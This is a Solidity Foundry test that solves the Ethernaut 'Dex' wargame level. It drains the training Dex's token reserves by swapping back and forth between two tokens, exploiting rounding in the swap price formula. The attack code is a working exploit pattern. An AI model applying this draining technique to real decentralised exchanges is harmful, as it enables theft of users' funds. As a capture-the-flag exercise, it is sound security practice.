pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";
import "../../src/ethernaut/22-Dex/Dex.sol";
import "../../src/ethernaut/22-Dex/DexFactory.sol";

contract DexTest is Test {
    Ethernaut ethernaut;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        DexFactory factory = new DexFactory();
        ethernaut.registerLevel(factory);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Dex dex = Dex(levelAddress);
        SwappableToken token1 = SwappableToken(dex.token1());
        SwappableToken token2 = SwappableToken(dex.token2());
        dex.approve(address(dex), 1000);
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this))
        );
        dex.swap(
            address(token2),
            address(token1),
            dex.balanceOf(address(token2), address(this))
        );
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this))
        );
        dex.swap(
            address(token2),
            address(token1),
            dex.balanceOf(address(token2), address(this))
        );
        dex.swap(
            address(token1),
            address(token2),
            dex.balanceOf(address(token1), address(this))
        );
        dex.swap(address(token2), address(token1), 45);
        console.log(
            "balance of token1 for dex",
            token1.balanceOf(address(dex))
        );
        console.log(
            "balance of token2 for dex",
            token2.balanceOf(address(dex))
        );
        console.log(
            "balance of token1 for player",
            token1.balanceOf(address(this))
        );
        console.log(
            "balance of token2 for player",
            token2.balanceOf(address(this))
        );

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
